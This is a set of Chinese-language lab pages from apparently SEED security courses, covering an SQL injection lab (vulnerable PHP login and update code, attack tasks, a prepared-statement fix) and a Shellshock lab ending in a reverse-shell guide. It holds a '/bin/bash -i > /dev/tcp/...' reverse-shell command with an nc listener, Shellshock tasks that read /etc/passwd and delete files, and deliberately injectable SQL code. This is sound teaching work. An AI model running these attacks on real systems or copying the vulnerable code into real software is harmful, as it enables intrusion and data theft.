

========================================
文件路径: .\SQL注入攻击实验\任务1：熟悉SQL语句\summary.html
========================================

<div>
<div>本任务的目标是熟悉 SQL 命令。我们的 Web 应用程序使用的数据存储在名为 MySQL 的数据库中，该数据库托管在我们的 MySQL 容器上。我们创建了一个名为 sqllab_users 的数据库，其中包含一个名为 credential 的表。此表格存储了每个员工个人资料信息（例如 eid、密码、工资等）。在这个任务中，你需要与数据库互动以熟悉 SQL 命令。</div>
<br>
<div>请在 MySQL 容器中获取一个 shell（参见容器手册中的说明，手册的链接在实验网站）。然后使用 mysql 客户端程序来与数据库进行交互。用户名是 root，密码是 dees。</div>
<br>
<div>
<pre class="language-markup"><code>// 在 MySQL 容器内
# mysql -u root -pdees</code></pre>
</div>
<br>
<div>登录后，可以创建新的数据库或加载已有的。因为我们已经创建了 sqllab_users 数据库，你只需要使用 use 命令来加载它。要查看 sqllab_users 数据库中的表，请使用 show tables 命令打印所选数据库中的所有表。</div>
<div>
<pre class="language-markup"><code>mysql&gt; use sqllab_users;
Database changed
mysql&gt; show tables;
+------------------------+
| Tables_in_sqllab_users |
+------------------------+
| credential             |
+------------------------+</code></pre>
</div>
<br>
<div>运行上述命令后，你需要使用 SQL 命令来打印员工 Alice 的所有个人资料信息。请提供你的结果截图。</div>
</div>

========================================
文件路径: .\SQL注入攻击实验\任务2：在SELECT语句上执行SQL注入攻击\summary.html
========================================

<div>SQL 注入是一种代码注入技术，通过该技术，攻击者可以执行自己的恶意 SQL 语句（通常称为恶意负载）。通过恶意 SQL 语句，攻击者可以从受害者数据库中窃取信息，甚至更改数据库。我们的员工管理 Web 应用程序存在 SQL 注入漏洞，这些漏洞模仿了开发人员经常犯的错误。</div>
<p></p>
<div>我们将使用 www.seed-server.com 中的登录页面来完成此任务。登录页面如下图 示。它要求用户提供用户名和密码。Web 应用程序根据这两条数据对用户进行身份验证，因此只有知道密码的员工才允许登录。作为攻击者，你的工作是在不知道任何员工密码的情况下登录 Web 应用程序。</div>
<div> </div>
<div><img class="img-fluid" style="display: block; margin-left: auto; margin-right: auto;" src="/static/files/Web_SQL/Figures/login.jpg" alt="登录" width="470" height="350"></div>
<div> </div>
<div>我们先解释一下这个 Web 应用程序是如何实现身份验证的。位于/var/www/SQL_Injection 目录中的 PHP 代码 unsafe_home.php 是用于进行用户身份验证的。以下代码片段显示了如何对用户进行身份验证。</div>
<p></p>
<div>
<pre class="language-markup"><code>$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);
...
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= '$input_uname' and Password='$hashed_pwd'";
$result = $conn -&gt; query($sql);


// 以下是伪代码
if(id != NULL) {
  if(name=='admin') {
     return All employees information;
  } else if (name !=NULL){
    return employee information;
  }
} else {
  Authentication Fails;
}</code></pre>
</div>
<p></p>
<div>上述 SQL 语句从 credential 表中选择员工个人信息，例如 id、name、salary、ssn 等。该 SQL 语句使用了两个变量  input_uname 和 hashed_pwd，其中 input_uname 保存着用户在登录页面的用户名字段中输入的信息，而 hashed_pwd 保存着用户输入的密码的 sha1 哈希值。程序检查数据库中是否有记录与提供的用户名和密码匹配，如果是的话，那么用户身份验证就成功了，相应的员工信息会提供给用户。如果没有记录匹配，则身份验证失败。</div>
<div> </div>
<div>
<div>
<h5><strong>任务 2.1：网页上的 SQL 注入攻击</strong></h5>
<div> </div>
<div>你的任务是从登录页面以管理员身份登录 Web 应用程序，以便查看所有员工的信息。我们假设你知道管理员的帐户名称，即 admin，但不知道密码。你需要决定在用户名和密码字段中输入什么才能成功登录。</div>
<br>
<h5><strong>任务 2.2：从命令行进行 SQL 注入攻击</strong></h5>
<div> </div>
<div>你的任务是重复任务 2.1，但你需要在不使用网页的情况下执行此操作。你可以使用命令行工具，例如 curl，它可以发送 HTTP 请求。值得一提的是，如果你想在 HTTP 请求中包含多个参数，则需要将 URL 和参数放在一对单引号之间，否则，用于分隔参数的特殊字符（例如 &amp;）将被 shell 程序解释，从而改变命令的含义。以下示例显示如何向我们的 Web 应用程序发送 HTTP GET 请求，并附加两个参数（username 和 Password）：</div>
<br>
<div>
<pre class="language-markup"><code>$ curl 'www.seed-server.com/unsafe_home.php?username=alice&amp;Password=11'</code></pre>
</div>
<br>
<div>如果你需要在用户名或密码字段中包含特殊字符，你需要对它们进行编码，否则，这些特殊字符可以改变你的请求的意义。如果你想在这些字段中包含单引号，你应该使用 %27 代替；如果要包含空格，则应使用 %20。在这个任务中，在发送请求时你需要处理好 HTTP 编码。</div>
<br>
<h5><strong>任务 2.3：附加一个新的SQL语句</strong></h5>
<div> </div>
<div>在这两个攻击中，我们只能从数据库中窃取信息，如果有办法可以利用这个登录页面的漏洞修改数据库将会更好。一个想法是使用 SQL 注入攻击注入两条 SQL 语句，第二条可以是更新或删除语句。在 SQL 中，分号 ';' 用于分隔两条 SQL 语句，请尝试通过登录页面运行两条 SQL 语句。</div>
<br>
<div>系统里有一个防范措施会防止你运行两条 SQL 语句，所以你的攻击不会成功。请查阅网络资源找出这种防范措施是什么，并将你的发现记录在实验报告中。</div>
</div>
</div>

========================================
文件路径: .\SQL注入攻击实验\任务3：在UPDATE语句上执行SQL注入攻击\summary.html
========================================

<div>
<div>如果一个 SQL 注入漏洞出现在 UPDATE 语句上，损害将会更大，因为攻击者可以利用这个漏洞修改数据库。我们的员工管理应用程序有一个允许员工更新其个人资料信息（包括昵称、电子邮件、地址、电话号码和密码）的页面（见下图）。要访问此页面，员工需要先登录。</div>
</div>
<div>
<div> </div>
<div><img class="img-fluid" style="display: block; margin-left: auto; margin-right: auto;" src="/static/files/Web_SQL/Figures/editprofile.jpg" alt="编辑信息" width="500" height="380"></div>
<div> </div>
<div>当员工通过这个编辑资料页面来更新他们的信息时，以下 SQL UPDATE 查询将被执行，这个代码在 unsafe_edit_backend.php 文件中，位于 /var/www/SQLInjection 目录下。</div>
<div>
<pre class="language-markup"><code>$hashed_pwd = sha1($input_pwd);
$sql = "UPDATE credential SET
  nickname='$input_nickname',
  email='$input_email',
  address='$input_address',
  Password='$hashed_pwd',
  PhoneNumber='$input_phonenumber'
  WHERE ID=$id;";
$conn-&gt;query($sql);</code></pre>
</div>
<div> </div>
<div> </div>
<h5><strong>任务 3.1：修改自己的工资</strong></h5>
<div> </div>
<div>如图所示，员工只能更新他们的昵称、电子邮件、地址、电话号码和密码，他们没有资格更改自己的工资。假设你是 Alice，你不满你的老板 Boby 今年没有给你加工资。你想利用编辑资料的 SQL 注入漏洞来增加自己的工资，请演示如何实现这一点。我们假定你知道工资在数据库表格中的列名是 salary。</div>
<br>
<h5><strong>任务 3.2：修改其他人的工资 </strong> </h5>
<div> </div>
<div>在增加了自己的工资之后，你决定惩罚你的老板 Boby。你想把他的工资减少到1美元。请演示如何实现这一点。</div>
<br>
<h5><strong>任务 3.3：修改其他人的密码</strong></h5>
<div> </div>
<div>在更改完 Boby 的工资后，你依然不满，所以想把 Boby 的密码改成你知道的内容，然后你就可以登录到他的账号。请演示如何实现这一点。需要注意的是，数据库中存储的是密码的哈希值而不是明文密码字符串。你可以再次查看 unsafe_edit_backend.php 代码以了解密码是如何被存储的，它使用 SHA1 哈希函数生成密码的哈希值。</div>
</div>

========================================
文件路径: .\SQL注入攻击实验\任务4：防范措施\summary.html
========================================

<div>SQL 注入漏洞的根本问题是未能将代码与数据区分开来。当在 Web 应用服务器端构建 SQL 语句时，程序员是知道哪一部分是数据哪一部分是代码，但在将 SQL 语句发送到数据库后，原来的界限已经消失，SQL 解释器看到的数据和代码的界限可能与开发人员设置的原始界限不同。为了解决这个问题，确保服务器端和数据库端看到的界限是一致至关重要。最安全的方法是使用“Prepared 语句”。</div>
<p></p>
<div><img class="img-fluid" style="display: block; margin-left: auto; margin-right: auto; border-radius: 0;" src="/static/files/Web_SQL/Figures/PreparedStatement_chinese.png" alt="SQL 准备状态" width="741" height="417"></div>
<div> </div>
<div>为了了解 Prepared 语句如何防止 SQL 注入，我们需要理解当 SQL 服务器收到 SQL 语句时会发生什么。上图展示了 SQL 语句执行的工作流程。在编译步骤中，语句首先通过解析和规范化阶段，检查其语法和语义。接下来是编译阶段，在这个阶段，关键字（如 SELECT、FROM、UPDATE 等）被转换成机器可理解的格式。基本上，在此阶段，语句就被解释了。在优化阶段会考虑执行语句的不同方案，并从中选择最佳的优化方案。所选的计划被缓存存储起来，当下一个语句进来时，它将与缓存中的内容进行比较，如果已经在缓存中，则可以跳过解析、编译和查询优化阶段，直接将已编译的语句交给执行阶段运行。</div>
<p></p>
<div>Prepared 语句不是一个完整的 SQL 语句，它的一些数据部分是空着的，需要在后面来填充。Prepared 语句会经过编译步骤转换成预编译的语句。要运行这个预编译语句，需要填充缺的数据，但是这些数据不会再经历编译步骤，它们将被直接插入到预编译语句中，交给执行引擎。因此，即使数据中包含 SQL 代码，这些代码也不会经过编译，它们会被当做数据，没有任何特殊意义。这就是 Prepared 语句为什么能防止 SQL 注入攻击的原理。</div>
<p></p>
<div>下面是一个使用 Prepared 语句的例子。我们使用 SELECT 语句作为示例，并展示如何使用 Prepared 语句来重写 SQL 代码。</div>
<p></p>
<div>
<pre class="language-markup"><code>$sql = "SELECT name, local, gender  
        FROM USER_TABLE
        WHERE id = $id AND password ='$pwd' ";
$result = $conn-&gt;query($sql)</code></pre>
</div>
<p></p>
<div>上述代码存在 SQL 注入漏洞。可以将其重写为以下形式</div>
<p></p>
<div>
<pre class="language-markup"><code>$stmt = $conn-&gt;prepare("SELECT name, local, gender
                        FROM USER_TABLE
                        WHERE id = ? and password = ? ");
// 绑定参数
$stmt-&gt;bind_param("is", $id, $pwd);
$stmt-&gt;execute();
$stmt-&gt;bind_result($bind_name, $bind_local, $bind_gender);
$stmt-&gt;fetch();</code></pre>
</div>
<p></p>
<div>使用 Prepared 语句，我们把发送 SQL 语句到数据库的过程分为两步。第一步是仅发送代码部分，即不包含实际数据。这是编译步骤。如上例所示，实际的数据被占位符（?）替换。在该步骤之后，我们再通过 bind_param() 发送数据给数据库。数据库把此步骤中发送的一切仅视为数据而不再将其视为代码。它将这些数据绑定到编译好的 Prepared 语句中的相应占位符上。在 bind_param() 方法中，第一个参数 "is" 指示了参数的类型： "i" 表明 $id 中的数据为整数类型，而 "s" 则表示 $pwd 中的数据为字符串类型。</div>
<p></p>
<div><strong>任务。</strong>在这个任务中，我们将使用 Prepared 语句来修复 SQL 注入漏洞。为了简化起见，在 defense 文件夹中我们创建了一个简化的程序。你需要对这个文件夹中的文件进行修改。如果你将浏览器指向以下 URL，则会看到类似于 Web 应用程序登录页面的页面。该页面允许你查询员工的信息，但需要提供正确的用户名和密码。</div>
<p></p>
<div>
<pre class="language-markup"><code>URL: http://www.seed-server.com/defense/</code></pre>
</div>
<p></p>
<div>此页中输入的数据将被发送到名为 getinfo.php 的服务器程序，该程序会调用名为 unsafe.php 的程序。这个 PHP 程序中的 SQL 查询存在 SQL 注入漏洞。你的任务是用 Prepared 语句修改 unsafe.php 中的 SQL 语句，从而使程序能够防范 SQL 注入攻击。在实验设置文件夹中，unsafe.php 程序位于 image_www/Code/defense 文件夹内。你可以直接在那里修改该程序。完成后，你需要重建并重启容器，否则更改将不会生效。你也可以通过 "docker cp" 命令将文件复制到正在运行的容器中。</div>
<p></p>
<div>你还可以在正在运行的容器内部修改此文件。在这个容器内，unsafe.php 程序位于 /var/www/SQL_Injection/defense 文件夹下。为了保持 Docker 镜像较小，我们在容器里仅安装了一个非常简单的文本编辑器 nano。对于简单的编辑来说应该足够了。如果你不喜欢这个编辑器，你也可以通过执行以下命令来安装其它命令行编辑器, 例如 “apt install -y vim”</div>
<div> </div>
<div>此安装将在容器关闭并销毁后被丢弃。如果你想让其永久化，则可以将安装命令添加到 image_www 文件夹内的 Dockerfile 中。</div>

========================================
文件路径: .\SQL注入攻击实验\实验环境\summary.html
========================================

<div>
<div>我们为这个实验开发了一个 Web 应用程序，并且使用容器来搭建实验环境。实验中包含两个容器，一个用于托管 Web 应用程序，另一个用于托管 Web 应用程序的数据库。Web应用程序容器的IP地址是 10.9.0.5，它的URL是 http://www.seed-server.com </div>
<br>
<div>我们需要将此主机名映射到容器的IP地址。请在 /etc/hosts 文件中添加以下条目。您需要使用 root 权限来更改此文件（使用 sudo）。需要注意的是，由于某些其他实验的原因，这个名称可能已经添加到了文件中。如果它被映射到不同的IP地址，则必须删除旧的条目。</div>
<pre class="language-markup"><code>10.9.0.5        www.seed-server.com</code></pre>
<br>
<div>
<div><strong>关于Web应用程序。</strong>我们创建了一个简单的员工管理应用程序。通过此Web应用程序，员工可以查看和更新其个人资料信息。在该 Web 应用程序中主要有两种角色：管理员是特权角色，可管理每个别员工的个人资料；员工是普通角色，只能查看或更新自己的个人资料信息。所有员工的信息描述见下表：</div>
<br>
<table style="border-collapse: collapse; width: 79.5351%; height: 222px; border-width: 1px;" border="1"><colgroup><col style="width: 7.93781%;"><col style="width: 14.483%;"><col style="width: 12.1156%;"><col style="width: 8.63411%;"><col style="width: 9.88745%;"><col style="width: 12.5334%;"><col style="width: 11.1408%;"><col style="width: 6.54521%;"><col style="width: 9.33041%;"><col style="width: 7.52003%;"></colgroup>
<tbody>
<tr style="height: 50.8807px;">
<td style="border-width: 1px;">Name</td>
<td style="border-width: 1px;">Employee ID</td>
<td style="border-width: 1px;">Password</td>
<td style="border-width: 1px;">Salary</td>
<td style="border-width: 1px;">Birthday</td>
<td style="border-width: 1px;">SSN</td>
<td style="border-width: 1px;">Nickname</td>
<td style="border-width: 1px;">Email</td>
<td style="border-width: 1px;">Address</td>
<td style="border-width: 1px;">Phone</td>
</tr>
<tr style="height: 28.9915px;">
<td style="border-width: 1px;">Admin</td>
<td style="border-width: 1px;">99999</td>
<td style="border-width: 1px;">seedadmin</td>
<td style="border-width: 1px;">400000</td>
<td style="border-width: 1px;">3/5</td>
<td style="border-width: 1px;">43254314</td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
</tr>
<tr style="height: 28.9915px;">
<td style="border-width: 1px;">Alice</td>
<td style="border-width: 1px;">10000</td>
<td style="border-width: 1px;">seedalice</td>
<td style="border-width: 1px;">20000</td>
<td style="border-width: 1px;">9/20</td>
<td style="border-width: 1px;">10211002</td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
</tr>
<tr style="height: 28.9915px;">
<td style="border-width: 1px;">Boby</td>
<td style="border-width: 1px;">20000</td>
<td style="border-width: 1px;">seedboby</td>
<td style="border-width: 1px;">50000</td>
<td style="border-width: 1px;">4/20</td>
<td style="border-width: 1px;">10213352</td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
</tr>
<tr style="height: 28.9915px;">
<td style="border-width: 1px;">Ryan</td>
<td style="border-width: 1px;">30000</td>
<td style="border-width: 1px;">seedryan</td>
<td style="border-width: 1px;">90000</td>
<td style="border-width: 1px;">4/10</td>
<td style="border-width: 1px;">32193525</td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
</tr>
<tr style="height: 26.8892px;">
<td style="border-width: 1px;">Samy</td>
<td style="border-width: 1px;">40000</td>
<td style="border-width: 1px;">seedsamy</td>
<td style="border-width: 1px;">40000</td>
<td style="border-width: 1px;">1/11</td>
<td style="border-width: 1px;">32111111</td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
</tr>
<tr style="height: 24.8892px;">
<td style="border-width: 1px;">Ted</td>
<td style="border-width: 1px;">50000</td>
<td style="border-width: 1px;">seedted</td>
<td style="border-width: 1px;">110000</td>
<td style="border-width: 1px;">11/3</td>
<td style="border-width: 1px;">32111111</td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
<td style="border-width: 1px;"> </td>
</tr>
</tbody>
</table>
<br>
<div> </div>
</div>
</div>

========================================
文件路径: .\Shellshock攻击实验\DNS设置\summary.html
========================================

<p>在我们的设置中，Web 服务器容器的 IP 地址是 10.9.0.5，主机名是 <!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->www.seed-server.com<!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->，我们需要将这个主机名和 IP 地址的映射添加到 /etc/hosts 文件中。需要使用 root 权限来修改该文件：</p>
<p><!----><!----><!----><!----><!----><!----><!----></p>
<div class="code-block ng-tns-c1921920065-293 ng-animate-disabled ng-trigger ng-trigger-codeBlockRevealAnimation"><!---->
<div class="formatted-code-block-internal-container ng-tns-c1921920065-293">
<div class="animated-opacity ng-tns-c1921920065-293">
<pre class="language-markup"><code>10.9.0.5       www.seed-server.com</code></pre>
</div>
</div>
</div>

========================================
文件路径: .\Shellshock攻击实验\Web服务器和CGI\summary.html
========================================

<p>在本实验中，我们将对 Web 服务器发起 Shellshock 攻击。许多 Web 服务器都用了 CGI，这是 Web 应用程序中生成动态内容的常用方法。许多 CGI 程序是 shell 脚本，因此在 CGI 程序运行之前，shell 程序会先运行。这种调用是由远程计算机的用户触发的，如果该 shell 程序是一个存在漏洞的 bash 程序，那么我们就可以利用 Shellshock 漏洞来获取服务器上的权限。</p>
<p>在我们的 Web 服务器中已经设置了一个非常简单的 CGI 程序 vul.cgi）， 它是个 shell 脚本，功能就是打印出 "Hello World"。该 CGI 程序放在 Apache 的默认 CGI 文件夹/usr/lib/cgi-bin 中，它必须设置成可执行的。</p>
<pre class="language-markup"><code>#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo
echo "Hello World"</code></pre>
<p>该 CGI 程序使用 /bin/bash_shellshock（第一行），而不是使用/bin/bash。这一行指定应当调用哪个 shell 程序来运行脚本。在本实验中，我们需要使用有漏洞的 bash 程序。</p>
<p>要从 Web 访问 CGI 程序，我们可以通过浏览器输入以下URL: <!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->http://www.seed-server.com/cgi-bin/vul.cgi<!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->， 或者使用以下命令行程序 curl 来执行相同操作。</p>
<pre class="language-markup"><code>$ curl http://www.seed-server.com/cgi-bin/vul.cgi</code></pre>

========================================
文件路径: .\Shellshock攻击实验\任务1：Bash函数实验\summary.html
========================================

<p>Ubuntu 20.04 中的 bash 程序已经打了补丁，因此它不再有 Shellshock 漏洞。为了本实验的目的， 我们在容器中安装了一个有漏洞的 bash 版本（在 /bin 中）。该程序也可以在 Labsetup 文件夹（在 image_www 中）找到。它的名字是 bash_shellshock。我们需要使用 这个 bash 程序来完成任务。你可以在容器中或直接在你的计算机上运行这个 shell 程序。</p>
<p>请设计一个实验来验证该 bash 程序是否容易受到 Shellshock 攻击。在已打了补丁的版本 /bin/bash 上进行相同的实验并报告你的观察结果。</p>

========================================
文件路径: .\Shellshock攻击实验\任务2.A：使用浏览器\summary.html
========================================

<div>
<div>在上面的代码中，① 打印出当前进程中所有环境变量的内容。通常，如果你使用浏览器访问 CGI 程序，你会看到类似以下的内容。请识别哪些环境变量的值是由浏览器设置的。你可以开启浏览器的 HTTP Header Live 扩展来捕获 HTTP 请求，并将请求与服务器打印出的环境变量进行对比。请将你的调查结果写在实验报告中。</div>
<div>
<pre class="language-markup"><code>****** Environment Variables ******
HTTP_HOST=www.seed-server.com
HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) ...
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9, ...
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT_ENCODING=gzip, deflate
...</code></pre>
</div>
</div>

========================================
文件路径: .\Shellshock攻击实验\任务2.B：使用curl\summary.html
========================================

<p>如果我们想将环境变量数据设置为任意值，就必须修改浏览器的行为，这样做会很复杂。幸运的是，有一个命令行工具叫做 curl，它允许用户控制 HTTP 请求中的大部分字段。这里是一些有用的选项：</p>
<ol>
<li>-v 选项可以打印出 HTTP 请求的头部；</li>
<li>-A、-e 和 -H 选项可以设置 HTTP 请求头部中的一些字段</li>
</ol>
<p>你需要弄清楚每个字段的作用。请在实验报告中记录你的发现。以下是如何使用这些字段的示例：</p>
<pre class="language-markup"><code>$ curl -v www.seed-server.com/cgi-bin/getenv.cgi
$ curl -A "my data" -v www.seed-server.com/cgi-bin/getenv.cgi
$ curl -e "my data" -v www.seed-server.com/cgi-bin/getenv.cgi
$ curl -H "AAAAAA: BBBBBB" -v www.seed-server.com/cgi-bin/getenv.cgi</code></pre>
<div>
<div>根据本实验，请描述 curl 的哪些选项可以用于将数据注入到目标 CGI 程序的环境变量中。</div>
</div>

========================================
文件路径: .\Shellshock攻击实验\任务2：通过环境变量传递数据给Bash\summary.html
========================================

<p>要利用 Shellshock 漏洞，攻击者需要将数据传递给有漏洞的 bash 程序，而且这些数据必须要通过 环境变量传递。在这个任务中，我们看看如何实现这一目标。我们在服务器上提供了另一个 CGI 程序（getenv.cgi）来帮助你识别哪些用户数据可以进入 CGI 程序的环境变量。该 CGI 程序会打印出它的所有环境变量。</p>
<pre class="language-markup"><code>#!/bin/bash_shellshock             

echo "Content-type: text/plain"
echo
echo "****** Environment Variables ******"
strings /proc/$$/environ               ①</code></pre>

========================================
文件路径: .\Shellshock攻击实验\任务3：发起Shellshock攻击\summary.html
========================================

<p>我们现在可以发起 Shellshock 攻击。该攻击不依赖于 CGI 程序中的内容，因为它针对的是 CGI 脚本执行之前调用的 bash 程序。你的任务是通过 URL <!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->http://www.seed-server.com/cgi-bin/vul.cgi<!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----> 发起攻击，以便让服务器运行任意命令。</p>
<p>如果你的命令有纯文本输出，并且你希望输出返回给你，输出需要遵循如下协议：它应该以 Content-type: text/plain 开头，后跟一个空行，然后就可以放置纯文本输出。例如，如果你希望服务器返回其文件夹中的文件列表，你的命令应该像下面这样：</p>
<pre class="language-markup"><code>echo Content-type: text/plain; echo; /bin/ls -l</code></pre>
<p>在这个任务中，请使用三种不同的方法（即三种不同的 HTTP 头字段）来对目标 CGI 程序发起 Shellshock 攻击。你需要实现以下目标，但对于每个目标，你只需要使用一种方法，但总共需要使用三种不同的方法。</p>
<ul>
<li>
<p>任务 3.A: 让服务器返回 /etc/passwd 文件的内容。</p>
</li>
<li>
<p>任务 3.B: 让服务器返回其进程的用户 ID。你可以使用 /bin/id 命令打印出 ID 信息。</p>
</li>
<li>
<p>任务 3.C: 让服务器在/tmp文件夹中创建一个文件。你需要进入容器查看文件是否被创建，或者使用另一个 Shellshock 攻击来列出 /tmp 文件夹中的内容。</p>
</li>
<li>
<p>任务 3.D: 让服务器删除你刚刚在 /tmp 文件夹中创建的文件。</p>
</li>
</ul>

========================================
文件路径: .\Shellshock攻击实验\任务4_通过Shellshock攻击获取反向Shell\summary.html
========================================

<div>
<div>Shellshock 漏洞允许攻击者在目标机器上运行任意命令。在实际攻击中，攻击者通常不会将命令固化在攻击中，而是选择运行一个 shell 命令，这样他们就可以使用这个 shell 来运行其他命令。为了实现这一目标，攻击者需要运行一个反向 shell。</div>
<br>
<div>反向 shell 是一个在受害者机器上运行的 shell 进程，但它从攻击者的机器获取输入并将输出打印在攻击者的机器上。反向 shell 为攻击者提供了在被攻陷的机器上运行 shell 命令的一种便捷方式。如何创建反向 shell 的详细说明可以在 SEED 书中找到。我们也在页面最后的指导中做了一些解释。在本任务中，你需要演示如何通过 Shellshock 攻击从受害者那里获得反向 shell。</div>
</div>

========================================
文件路径: .\Shellshock攻击实验\任务5：使用已修补的Bash\summary.html
========================================

<div>
<div>在该任务中，我们使用一个已经打了补丁的 bash 程序。/bin/bash 程序是修补后的版本。请将 CGI 程序的第一行替换为这个程序。重新做一次任务 3，描述你的观察结果。</div>
<br><br></div>

========================================
文件路径: .\Shellshock攻击实验\实验环境\summary.html
========================================

<div>本实验在 SEEDUbuntu20.04 VM 中测试可行。你可以在本页面右端选择虚拟机版本为 SEEDUbuntu20.04，点击“创建虚拟机”来获取虚拟机平台的临时用户名与密码，登录虚拟机平台即可获得一台预先构建好的 SEEDUbuntu20.04 VM，该虚拟机以及用户名密码将在开启 24 小时后自动销毁。</div>
<div> </div>
<div>
<div>
<div>本实验采用 Docker 容器来建立实验环境，所以不太依赖 SEED VM。你也可以在其他 VM、物理机器以及云端 VM 上<span style="text-align: initial;">自行配置环境进行实验，实验所需的文件可根据你的芯片类型从下方下载，解压后会得到一个名为 Labsetup 的文件夹，该文件夹内包含了完成本实验所需的所有文件</span></div>
</div>
</div>

========================================
文件路径: .\Shellshock攻击实验\容器设置和命令\summary.html
========================================

<p>解压 Labsetup 压缩包， 进入 Labsetup 文件夹，然后用 docker-compose.yml 文件安装实验环境。 对这个文件及其包含的所有 Dockerfile 文件中的内容的详细解释都可以在<a href="https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md" target="_blank" rel="noopener">用户手册</a>（注意：如果你在部署容器的过程中发现从官方源下载容器镜像非常慢，可以参考手册中的说明使用当地的镜像服务器）中找到。 如果这是你第一次使用容器设置 SEED 实验环境，那么阅读用户手册非常重要。</p>
<p>在下面，我们列出了一些与 Docker 和 Compose 相关的常用命令。 由于我们将非常频繁地使用这些命令，因此我们在 .bashrc 文件 （在我们提供的 SEED Ubuntu 20.04 虚拟机中）中为它们创建了别名。</p>
<p><!----><!----><!----><!----><!----><!----><!----></p>
<div class="code-block ng-tns-c1921920065-302 ng-animate-disabled ng-trigger ng-trigger-codeBlockRevealAnimation"><!---->
<div class="formatted-code-block-internal-container ng-tns-c1921920065-302">
<div class="animated-opacity ng-tns-c1921920065-302">
<pre class="language-markup"><code>$ docker-compose build  # 建立容器镜像
$ docker-compose up     # 启动容器
$ docker-compose down   # 关闭容器

// 上述 Compose 命令的别名
$ dcbuild       # docker-compose build 的别名
$ dcup          # docker-compose up 的别名
$ dcdown        # docker-compose down 的别名</code></pre>
<p>所有容器都在后台运行。 要在容器上运行命令，我们通常需要获得容器里的 Shell 。 首先需要使用 docker ps 命令找出容器的 ID ， 然后使用 docker exec 在该容器上启动 Shell 。 我们已经在 .bashrc 文件中为这两个命令创建了别名。</p>
<pre class="language-markup"><code>$ dockps        // docker ps --format "{{.ID}}  {{.Names}}" 的别名
$ docksh &lt;id&gt;   // docker exec -it &lt;id&gt; /bin/bash 的别名

// 下面的例子展示了如何在主机 C 内部得到 Shell
$ dockps
b1004832e275  hostA-10.9.0.5
0af4ea7a3e2e  hostB-10.9.0.6
9652715c8e0a  hostC-10.9.0.7

$ docksh 96
root@9652715c8e0a:/#

// 注: 如果一条 docker 命令需要容器 ID，你不需要
//     输入整个 ID 字符串。只要它们在所有容器当中
//     是独一无二的，那只输入前几个字符就足够了。</code></pre>
<p>如果你在设置实验环境时遇到问题，可以尝试从手册的“Miscellaneous Problems”部分中寻找解决方案。</p>
</div>
</div>
</div>

========================================
文件路径: .\Shellshock攻击实验\指导：创建反向Shell\summary.html
========================================

<p>反向 shell 的关键思想是将 shell 的标准输入、输出和错误设备重定向到网络连接，这样 shell 就会从该连接获取输入，并将输出也发送回该连接。在连接的另一端运行的是攻击者的程序，这个程序只是显示来自另一端的 shell 程序打印出来的内容，并将攻击者键入的内容通过网络连接发送给 shell 程序。</p>
<p>攻击端常用的一个程序是 netcat，如果用 "-l" 选项，则会运行一个监听指定端口的 TCP 服务器。该服务器程序会打印客户端发送来的内容，并把用户输入的内容发到客户端。在下面的实验中，我们将使用 netcat（简写为 nc）来监听 9090 端口。我们先仅关注第一行。 </p>
<pre class="language-markup"><code>Attacker(10.0.2.6):$ nc -nv -l 9090
Listening on 0.0.0.0 9090
Connection received on 10.0.2.5 39452
Server(10.0.2.5):$ 
Server(10.0.2.5):$ ifconfig
ifconfig
enp0s3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.0.2.5  netmask 255.255.255.0  broadcast 10.0.2.255
        ...</code></pre>
<p>上述的 nc 命令会阻塞，等待连接。我们在服务器（10.0.2.5）上直接运行以下 bash 程序，这是模拟攻击者通过漏洞在服务器上做的事。这个 bash 命令将与攻击者机器的 9090 的端口建立一个 TCP 连接，从而创建一个反向 shell。我们可以从上述结果中看到 shell 程序的提示符，这表明 shell 程序正在服务器上运行。我们可以通过键入 ifconfig 命令来验证 IP 地址确实为 10.0.2.5，这是属于服务器的 IP 地址。以下是 bash 命令：</p>
<pre class="language-markup"><code>Server(10.0.2.5):$ /bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1</code></pre>
<p>上述命令比较复杂，我们在下面进行详细的解释：</p>
<ul>
<li>
<p>“/bin/bash -i”: 选项 i 表示这是交互模式，意味着 shell 程序会提供 shell 提示符。</p>
</li>
<li>
<p>“&gt; /dev/tcp/10.0.2.6/9090”: 这使得 shell 程序的标准输出设备 stdout 被重定向到一个指定的 TCP 连接。在 unix 系统中，stdout 的文件描述符为 1。</p>
</li>
<li>
